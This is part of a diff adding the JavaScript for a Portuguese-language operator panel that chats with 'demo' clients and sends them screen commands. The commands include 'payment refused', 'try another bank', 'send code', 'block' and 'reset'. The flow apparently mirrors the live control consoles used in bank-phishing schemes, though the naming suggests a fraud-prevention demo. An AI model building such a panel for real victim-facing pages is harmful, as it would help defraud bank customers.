+  if(!selectedDemoClient){
+    return [];
+  }
+
+  try{
+
+    return JSON.parse(
+      localStorage.getItem(
+        chatKey()
+      ) || '[]'
+    );
+
+  }catch(error){
+
+    return [];
+
+  }
+
+}
+
+
+function saveChat(messages){
+
+  localStorage.setItem(
+    chatKey(),
+    JSON.stringify(messages)
+  );
+
+  renderChatOperator();
+
+}
+
+
+function renderChatOperator(){
+
+  const box =
+    document.getElementById(
+      'chatOperator'
+    );
+
+  if(!box){
+    return;
+  }
+
+  if(!selectedDemoClient){
+
+    box.innerHTML =
+      '<div class="muted">' +
+      'Selecione um cliente para visualizar a conversa.' +
+      '</div>';
+
+    return;
+
+  }
+
+  const messages =
+    getChat();
+
+  if(!messages.length){
+
+    box.innerHTML =
+      '<div class="muted">' +
+      'Nenhuma mensagem.' +
+      '</div>';
+
+    return;
+
+  }
+
+  box.innerHTML =
+    messages.map(
+      function(item){
+
+        const isClient =
+          item.from === 'cliente';
+
+        return `
+          <div class="chat-message ${isClient ? 'client' : 'operator'}">
+            <div class="chat-meta">
+              ${isClient ? 'Cliente' : 'Operador'}
+            </div>
+            <div>
+              ${escapeHtml(item.text || '')}
+            </div>
+          </div>
+        `;
+
+      }
+    ).join('');
+
+  box.scrollTop =
+    box.scrollHeight;
+
+}
+
+
+function sendOperatorChat(){
+
+  if(!ensureSelectedClient()){
+    return;
+  }
+
+  const input =
+    document.getElementById(
+      'chatOpInput'
+    );
+
+  const text =
+    (input?.value || '').trim();
+
+  if(!text){
+    return;
+  }
+
+  const messages =
+    getChat();
+
+  messages.push({
+    from:'operador',
+    text:text,
+    time:Date.now()
+  });
+
+  saveChat(
+    messages
+  );
+
+  broadcast({
+    type:'chat',
+    clientId:selectedDemoClient,
+    from:'operator',
+    message:text,
+    messages:messages
+  });
+
+  addEvent(
+    'Operador enviou mensagem.'
+  );
+
+  if(input){
+
+    input.value = '';
+    input.focus();
+
+  }
+
+}
+
+
+function sendHelpPrompt(){
+
+  if(!ensureSelectedClient()){
+    return;
+  }
+
+  const messages =
+    getChat();
+
+  messages.push({
+    from:'operador',
+    text:'Posso ajudar?',
+    time:Date.now()
+  });
+
+  saveChat(
+    messages
+  );
+
+  broadcast({
+    type:'chat',
+    clientId:selectedDemoClient,
+    from:'operator',
+    message:'Posso ajudar?',
+    messages:messages
+  });
+
+  addEvent(
+    'Operador enviou: Posso ajudar?'
+  );
+
+}
+
+
+function clearOperatorChat(){
+
+  if(!ensureSelectedClient()){
+    return;
+  }
+
+  localStorage.removeItem(
+    chatKey()
+  );
+
+  broadcast({
+    type:'chat',
+    clientId:selectedDemoClient,
+    from:'operator',
+    message:'',
+    messages:[],
+    cleared:true
+  });
+
+  renderChatOperator();
+
+  addEvent(
+    'Conversa limpa.'
+  );
+
+}
+
+
+function addEvent(text){
+
+  events.unshift({
+    text:text,
+    time:new Date()
+      .toLocaleTimeString(
+        'pt-BR'
+      )
+  });
+
+  if(events.length > 50){
+
+    events =
+      events.slice(
+        0,
+        50
+      );
+
+  }
+
+  renderEvents();
+
+}
+
+
+function renderEvents(){
+
+  const box =
+    document.getElementById(
+      'eventsList'
+    );
+
+  if(!box){
+    return;
+  }
+
+  if(!events.length){
+
+    box.innerHTML =
+      '<div class="muted">' +
+      'Nenhuma ação registrada.' +
+      '</div>';
+
+    return;
+
+  }
+
+  box.innerHTML =
+    events.map(
+      function(item){
+
+        return `
+          <div class="event-item">
+            <div class="event-time">
+              ${escapeHtml(item.time)}
+            </div>
+            <div>
+              ${escapeHtml(item.text)}
+            </div>
+          </div>
+        `;
+
+      }
+    ).join('');
+
+}
+
+
+function processOperatorEvent(data){
+
+  if(!data){
+    return;
+  }
+
+
+  if(
+    data.type === 'client_list' ||
+    data.type === 'state'
+  ){
+
+    if(Array.isArray(data.clients)){
+
+      processClientList(
+        data.clients
+      );
+
+    }
+
+    return;
+
+  }
+
+
+  if(
+    data.type === 'demo_bank_confirmed'
+  ){
+
+    const id =
+      data.clientId || '';
+
+    const existing =
+      connectedDemoClients.find(
+        function(client){
+          return (
+            client.clientId ===
+            id
+          );
+        }
+      );
+
+    const client = {
+
+      clientId:id,
+
+      role:'client',
+
+      connectedAt:
+        existing?.connectedAt ||
+        Date.now(),
+
+      name:
+        data.name ||
+        data.firstName ||
+        existing?.name ||
+        'Cliente',
+
+      confirmed:true,
+
+      online:true
+
+    };
+
+    if(existing){
+
+      Object.assign(
+        existing,
+        client
+      );
+
+    }else{
+
+      connectedDemoClients.push(
+        client
+      );
+
+    }
+
+    renderConnectedClients();
+
+    if(
+      id ===
+      selectedDemoClient
+    ){
+
+      markReady();
+
+    }
+
+    addEvent(
+      'Cliente confirmou os dados.'
+    );
+
+    return;
+
+  }
+
+
+  if(
+    data.type === 'client_ready'
+  ){
+
+    /*
+       O registro da confirmação não depende de o cliente estar
+       selecionado naquele exato instante. Isso é importante no
+       celular, porque o evento pode chegar antes da seleção visual.
+    */
+    if(data.clientId){
+      localStorage.setItem(
+        'preventDemoClientConfirmed:'+data.clientId,
+        '1'
+      );
+    }
+
+    if(
+      data.clientId ===
+      selectedDemoClient
+    ){
+
+      markReady();
+
+    }
+
+    addEvent(
+      'Cliente apertou CONTINUAR.'
+    );
+
+    return;
+
+  }
+
+
+  if(
+    data.type === 'chat'
+  ){
+
+    if(
+      data.clientId !==
+      selectedDemoClient
+    ){
+
+      return;
+
+    }
+
+    if(
+      Array.isArray(
+        data.messages
+      )
+    ){
+
+      localStorage.setItem(
+        chatKey(),
+        JSON.stringify(
+          data.messages
+        )
+      );
+
+    }else if(
+      data.message
+    ){
+
+      const messages =
+        getChat();
+
+      messages.push({
+        from:
+          (
+            data.from === 'cliente' ||
+            data.from === 'client' ||
+            data.from === 'public'
+          )
+            ? 'cliente'
+            : 'operador',
+
+        text:
+          data.message,
+
+        time:Date.now()
+
+      });
+
+      localStorage.setItem(
+        chatKey(),
+        JSON.stringify(
+          messages
+        )
+      );
+
+    }
+
+    renderChatOperator();
+
+    if(
+      data.from === 'cliente' ||
+      data.from === 'client' ||
+      data.from === 'public'
+    ){
+
+      addEvent(
+        'Cliente enviou mensagem no chat.'
+      );
+
+    }
+
+    return;
+
+  }
+
+
+  if(
+    data.type === 'operator_message' &&
+    data.clientId ===
+    selectedDemoClient
+  ){
+
+    if(data.action === 'code'){
+
+      renderReturnCode(
+        data.code || ''
+      );
+
+    }
+
+    return;
+
+  }
+
+
+  if(
+    data.type === 'client_access' &&
+    data.clientId ===
+    selectedDemoClient
+  ){
+
+    const config =
+      getConfig();
+
+    saveConfig({
+      ...config,
+      locked:
+        Boolean(data.locked)
+    });
+
+    renderAccess();
+
+    return;
+
+  }
+
+
+  if(
+    data.type === 'refund' &&
+    data.clientId ===
+    selectedDemoClient
+  ){
+
+    localStorage.setItem(
+      refundStatusKey(),
+      data.status || ''
+    );
+
+    updateClientPreview(
+      data.preview ||
+      previewForStatus(
+        data.status
+      )
+    );
+
+    renderRefundStatus();
+
+    return;
+
+  }
+
+
+  if(
+    data.type === 'convenio_state' &&
+    data.clientId ===
+    selectedDemoClient
+  ){
+
+    localStorage.setItem(
+      convenioKey(),
+      data.state === 'blocked'
+        ? 'blocked'
+        : 'available'
+    );
+
+    renderConvenio();
+
+    return;
+
+  }
+
+
+  if(
+    data.type === 'event' &&
+    (
+      !data.clientId ||
+      data.clientId ===
+      selectedDemoClient
+    )
+  ){
+
+    addEvent(
+      data.action ||
+      'Ação recebida do cliente.'
+    );
+
+  }
+
+}
+
+
+if(demoSync){
+
+  try{
+
+    demoSync.addEventListener(
+      'message',
+      function(event){
+
+        processOperatorEvent(
+          event.data
+        );
+
+      }
+    );
+
+  }catch(error){}
+
+}
+
+
+window.addEventListener(
+  'demo-public-message',
+  function(event){
+
+    processOperatorEvent(
+      event.detail
+    );
+
+  }
+);
+
+
+window.addEventListener(
+  'storage',
+  function(event){
+
+    if(
+      event.key ===
+      'preventDemoLastEvent' &&
+      event.newValue
+    ){
+
+      try{
+
+        processOperatorEvent(
+          JSON.parse(
+            event.newValue
+          )
+        );
+
+      }catch(error){}
+
+    }
+
+    if(
+      selectedDemoClient &&
+      event.key ===
+      chatKey()
+    ){
+
+      renderChatOperator();
+
+    }
+
+    if(
+      selectedDemoClient &&
+      event.key ===
+      confirmedKey()
+    ){
+
+      updateReadyNotice();
+
+    }
+
+    if(
+      selectedDemoClient &&
+      event.key ===
+      refundStatusKey()
+    ){
+
+      renderRefundStatus();
+
+    }
+
+  }
+);
+
+
+document
+  .getElementById(
+    'chatOpInput'
+  )
+  ?.addEventListener(
+    'keydown',
+    function(event){
+
+      if(
+        event.key === 'Enter' &&
+        !event.shiftKey
+      ){
+
+        event.preventDefault();
+
+        sendOperatorChat();
+
+      }
+
+    }
+  );
+
+
+function renderAll(){
+
+  renderConnectedClients();
+  updateReadyNotice();
+  renderAccess();
+  renderConvenio();
+  renderRefundStatus();
+  renderChatOperator();
+  renderEvents();
+
+}
+
+
+if(
+  localStorage.getItem(
+    convenioKey()
+  ) === null
+){
+
+  localStorage.setItem(
+    convenioKey(),
+    'available'
+  );
+
+}
+
+
+/* =========================================================
+   REMOVER CLIENTE SELECIONADO
+========================================================= */
+
+function removerClienteSelecionado(){
+
+  if(!selectedDemoClient){
+    alert('Selecione um cliente conectado primeiro.');
+    return;
+  }
+
+  const clientId=selectedDemoClient;
+
+  try{
+    if(window.demoPublic && typeof window.demoPublic.send==='function'){
+      window.demoPublic.send({
+        type:'remove_client',
+        clientId,
+        at:Date.now()
+      });
+    }
+  }catch(error){}
+
+  selectedDemoClient='';
+  localStorage.removeItem('preventOperatorSelectedClient');
+  renderAll();
+  addEvent('Cliente removido: ' + clientId);
+}
+
+
+/* =========================================================
+   COMANDOS DOS BOTÕES
+========================================================= */
+
+function enviarComando(action, extra = {}){
+
+  if(!selectedDemoClient){
+    return false;
+  }
+
+  const packet = {
+
+    type:'operator_action',
+
+    clientId:
+      selectedDemoClient,
+
+    action:action,
+
+    ...(extra || {}),
+
+    at:Date.now()
+
+  };
+
+  try{
+
+    if(
+      window.demoPublic &&
+      typeof window.demoPublic.send ===
+      'function'
+    ){
+
+      window.demoPublic.send(
+        packet
+      );
+
+    }
+
+  }catch(error){}
+
+  return true;
+
+}
+
+
+window.enviarComandoCliente =
+  enviarComando;
+
+
+window.aguardarCliente =
+  function(){
+
+    enviarComando(
+      'aguarde'
+    );
+
+  };
+
+
+window.concluindoCliente =
+  function(){
+
+    enviarComando(
+      'concluindo'
+    );
+
+  };
+
+
+window.pagamentoRecusado =
+  function(){
+
+    enviarComando(
+      'pagamento_recusado'
+    );
+
+  };
+
+
+window.digiteOutroBanco =
+  function(){
+
+    enviarComando(
+      'outro_banco'
+    );
+
+  };
+
+
+window.bloquearCliente =
+  function(){
+
+    enviarComando(
+      'bloquear'
+    );
+
+  };
+
+
+window.liberarCliente =
+  function(){
+
+    enviarComando(
+      'liberar'
+    );
+
+  };
+
+
+window.resetarCliente =
+  function(){
+
+    enviarComando(
+      'resetar'
+    );
+
+  };
+
+
+window.limparMensagemCliente =
+  function(){
+
+    enviarComando(
+      'limpar_mensagem'
+    );
+
+  };
+
+
+window.bloquearConvenio =
+  function(){
+
+    enviarComando(
+      'bloquear_convenio'
+    );
+
+  };
+
+
+window.liberarConvenio =
+  function(){
+
+    enviarComando(
+      'liberar_convenio'
+    );
+
+  };
+
+
+window.enviarMensagemCliente =
+  function(mensagem){
+
+    if(!mensagem){
+      return;
+    }
+
+    enviarComando(
+      'mensagem',
+      {
+        message:String(
+          mensagem
+        )
+      }
+    );
+
+  };
+
+
+window.enviarCodigoCliente =
+  function(codigo){
+
+    if(!codigo){
+      return;
+    }
+
+    enviarComando(
+      'codigo',
+      {
+        code:String(
+          codigo
+        )
+      }
+    );
+
+  };
+
+
+window.limparCodigoCliente =
+  function(){
+
+    enviarComando(
+      'limpar_codigo'
+    );
+
+  };
+
+
+window.enviarChatCliente =
+  function(texto){
+
+    if(!texto){
+      return;
+    }
+
+    if(!selectedDemoClient){
+      return;
+    }
+
+    if(
+      !window.demoPublic
+    ){
+
+      return;
+
+    }
+
+    window.demoPublic.send({
+
+      type:'chat',
+
+      clientId:
+        selectedDemoClient,
+
+      from:'operador',
+
+      messages:[
+        {
+          from:'operador',
+          text:String(texto),
+          time:new Date()
+            .toISOString()
+        }
+      ]
+
+    });
+
+  };
+
+
+/* =========================================================
+   PEGAR ESTADO ATUAL DO PUBLIC-SYNC
+========================================================= */
+
+setTimeout(
+  function(){
+
+    try{
+
+      if(
+        window.demoPublic &&
+        typeof
+        window.demoPublic.getClientList ===
+        'function'
+      ){
+
+        const clients =
+          window.demoPublic.getClientList();
+
+        if(
+          Array.isArray(clients) &&
+          clients.length
+        ){
+
+          processClientList(
+            clients
+          );
+
+        }
+
+      }
+
+      if(
+        window.demoPublic &&
+        typeof
+        window.demoPublic.getLastState ===
+        'function'
+      ){
+
+        const state =
+          window.demoPublic.getLastState();
+
+        if(
+          state &&
+          Array.isArray(
+            state.clients
+          )
+        ){
+
+          processClientList(
+            state.clients
+          );
+
+        }
+
+      }
+
+    }catch(error){}
+
+    renderAll();
+
+  },
+  700
+);
+
+
+renderAll();
+
+</script>
+
+</body>
+</html>
